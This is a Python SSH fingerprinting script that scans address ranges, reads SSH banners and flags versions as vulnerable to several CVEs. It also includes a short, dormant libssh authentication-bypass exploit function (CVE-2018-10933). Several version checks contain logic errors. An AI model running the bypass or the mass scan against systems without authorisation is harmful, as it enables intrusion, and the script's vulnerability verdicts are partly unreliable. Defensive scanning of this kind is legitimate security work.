#! /usr/bin/env python3
# -*- coding: utf-8 -*- 
r''' 
    	Copyright 2024 Photubias(c)

        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program.  If not, see <http://www.gnu.org/licenses/>.
        
        File name SSH-fingerprinter.py
        written by Tijl Deneut

        This script tries to detect the SSH version and banner.
        Source (a.o.): https://github.com/leapsecurity/libssh-scanner/raw/master/libsshscan.py

        ## INFO:
        # CVE-2018-10933 (RCE) for libssh v0.6.0 and up
        #   fixed in libssh 0.7.6
        #   fixed in libssh 0.8.4
        #   Only libssh is vulnerable, libssh2 is not
        # CVE-2023-38408 (RCE) for OpenSSH < 9.3p2
        # CVE-2024-6387 (RCE) for OpenSSH < 4.4p1 and 8.5p1 < 9.8p1 (9.8p1 is patched)
'''
import sys, socket, optparse, os
from multiprocessing.dummy import Pool as ThreadPool
from itertools import repeat
try: import paramiko
except: exit('[-] Error: Paramiko required: python3 -m pip install paramiko')

iTimeout = 2 ## seconds

def getIPs(cidr):
    def ip2bin(ip):
        b = ''
        inQuads = ip.split('.')
        outQuads = 4
        for q in inQuads:
            if q != '':
                b += dec2bin(int(q),8)
                outQuads -= 1
        while outQuads > 0:
            b += '00000000'
            outQuads -= 1
        return b
    def bin2ip(b):
        ip = ''
        for i in range(0,len(b),8):
            ip += str(int(b[i:i+8],2)) + '.'
        return ip[:-1]
    def dec2bin(n,d=None):
        s = ''
        while n>0:
            if n&1: s = '1' + s
            else: s = '0' + s
            n >>= 1
        if d is not None:
            while len(s)<d: s = '0' + s
        if s == '': s = '0'
        return s
    iplist=[]
    parts = cidr.split("/")
    baseIP = ip2bin(parts[0])
    subnet = int(parts[1])
    if subnet == 32:
        iplist.append(bin2ip(baseIP))
    else:
        ipPrefix = baseIP[:-(32-subnet)]
        for i in range(2**(32-subnet)):
            iplist.append(bin2ip(ipPrefix+dec2bin(i, (32-subnet))))
    return iplist

def getIPsFromFile(sFile):
    lstLines = open(sFile,'r').read().splitlines()
    lstIPs = []
    for sLine in lstLines: ## Line can be an IP or a CIDR
        for sIP in getIPs(sLine): lstIPs.append(sIP)
    return lstIPs

def vulnByBanner(sBanner, sIP, iPort):
    ## CVE-2018-10933
    boolVuln = boolPatched = False
    if 'libssh' in sBanner.lower():
        if '0.6' in sBanner: boolVuln = True
        elif '0.7' in sBanner and int(sBanner.split('.')[-1]) >= 6: boolPatched = True
        elif '0.7' in sBanner: boolVuln = True
        elif '0.8' in sBanner and int(sBanner.split('.')[-1]) >= 4: boolPatched = True
        elif '0.8' in sBanner: boolVuln = True
    if boolVuln: print(f'[!]    Connection {sIP}:{iPort} is vulnerable to CVE-2018-10933 (Unauthenticated Remote Code Execution)')
    elif boolPatched: print(f'[!]    Connection {sIP}:{iPort} is patched for CVE-2018-10933')
    ## CVE-2023-38408
    boolVuln = boolPatched = False
    try:
        if ('openssh') and ('ubuntu' or 'debian') in sBanner.lower():
            iMaj = int(sBanner.lower().split('openssh_')[1].split('.')[0])
            iMin = int(sBanner.lower().split('openssh_')[1].split('.')[1][0])
            if not (iMaj >= 9 and iMin >= 3): 
                boolVuln = True
    except: pass
    if boolVuln: print(f'[!]    Connection {sIP}:{iPort} is vulnerable to CVE-2023-38408 (Authenticated Session takeover)')
    ## CVE-2024-6387
    boolVuln = boolPatched = False
    try:
        if ('openssh') in sBanner.lower():
            iMaj = int(sBanner.lower().split('openssh_')[1].split('.')[0])
            iMin = int(sBanner.lower().split('openssh_')[1].split('.')[1][0])
            if (iMaj < 4): boolVuln = True  ## Everything before OpenSSH 4.4p1
            elif (iMaj == 4 and iMin <= 4): boolVuln = True ## After 4.4p1 it is patched
            elif (iMaj == 8 and iMin >= 5): boolVuln = True ## Again vuln after 8.5p1
            elif (iMaj == 9 and iMin <= 7): boolVuln = True ## Before 9.7p1
    except: pass
    if boolVuln: print(f'[!]    Connection {sIP}:{iPort} is vulnerable to CVE-2024-6387 (Unauth RCE based on CVE-2006-5051: "regreSSHion")')
    return

def tryCVE_2018_10933(sIP, iPort, boolVerbose, sCommand = 'hostname'):
    try:
        oSock = socket.create_connection((sIP, iPort), timeout=iTimeout)

        oMsg = paramiko.message.Message()
        oTrans = paramiko.transport.Transport(oSock)
        oTrans.start_client()

        oMsg.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        oTrans._send_message(oMsg)
        oCon = oTrans.open_session(timeout=iTimeout)
        '''
        ## This actually executes the command
        oCon.exec_command(sCommand)
        oResponse = oCon.makefile("rb", 2048)
        bOut = oResponse.read()
        oResponse.close()
        print(bOut.decode(errors='none'))
        '''
        oSock.close()
        print(f'[!]    Confirmed: connection {sIP}:{iPort} is vulnerable to CVE-2018-10933 (Unauthenticated Remote Code Execution)')
    except (socket.timeout, socket.error) as e:
        if boolVerbose: print(f'[-] Connection {sIP}:{iPort} timed out')
    except paramiko.SSHException as e:
        if boolVerbose: print(f'[-] Connection {sIP}:{iPort} has an SSH exception: {e}')
    except Exception as e:
        if boolVerbose: print(f'[-] Connection {sIP}:{iPort} has general exception: {e}')
    return

def getBanner(arrArgs):
    #sIP, iPort, boolVerbose, boolVuln
    sIP = arrArgs[0]; iPort = arrArgs[1]; boolVerbose = arrArgs[2]; boolVuln = arrArgs[3]
    sBanner = ''
    try:
        oSock = socket.create_connection((sIP, iPort), timeout=iTimeout)
        bBanner = oSock.recv(1024)
        oSock.close()
        try: 
            sBanner = bBanner.split(b'\n')[0].decode(errors='ignore')
            print(f'[+] Connection {sIP}:{iPort} has banner {sBanner}')
            if boolVuln: vulnByBanner(sBanner, sIP, iPort)
        except: pass
    except:
        if boolVerbose: print(f'[-] Connection {sIP}:{iPort} timed out')
    return sBanner

def main():
    boolVerbose = False
    ## Banner
    print(r'''
    [*****************************************************************************]
                              --- SSH Fingerprinter ---
    This script will try to identify a running SSH service and some distinct vulns.
    Just run it without arguments, or provide arguments of your choice
    ______________________/-> Created By Tijl Deneut(c) <-\_______________________
    [*****************************************************************************]
    ''')
    ## Defaults and parsing arguments
    sUsage = ('usage: %prog [options] SUBNET/ADDRESS/FILE\n'
              'This script performs enumeration of SSH ports, default TCP/22\n'
              'Last argument should be the target: IP, CIDR or file containing addresses/subnets')
    oParser = optparse.OptionParser(usage=sUsage)
    oParser.add_option('--port', '-p', metavar='INT', help='Port to use, default 22', default=22, type=int)
    oParser.add_option('--verbose', '-v', action='store_true', help='Verbosity. Default False', default=False)
    (oOptions, lstArgs) = oParser.parse_args()

    if not lstArgs or not len(lstArgs) == 1:
        sCIDR = input('[?] Please enter the subnet or IP to scan [192.168.50.0/24] : ')
        if sCIDR == '': sCIDR = '192.168.50.0/24'
        lstIPs = getIPs(sCIDR)
    else:
        if os.path.isfile(lstArgs[0]):
            print('[+] Parsing file {} for IP addresses/networks.'.format(lstArgs[0]))
            lstIPs = getIPsFromFile(lstArgs[0])
        else: 
            lstIPs = getIPs(lstArgs[0])

    print(f'[!] Sending requests to {len(lstIPs)} addresses')
    pool = ThreadPool(64)
    pool.map(getBanner, zip(lstIPs, repeat(oOptions.port), repeat(boolVerbose), repeat(True)))
    
    #sBanner = getBanner((sIP, iPort, boolVerbose, False))
    #vulnByBanner(sBanner, sIP, iPort)
    #tryCVE_2018_10933(sIP, iPort, boolVerbose, sCommand = 'hostname')

    if len(sys.argv) == 1: input('Press [Enter] key to exit')
    exit(0)
        
if __name__ == '__main__':
	main()
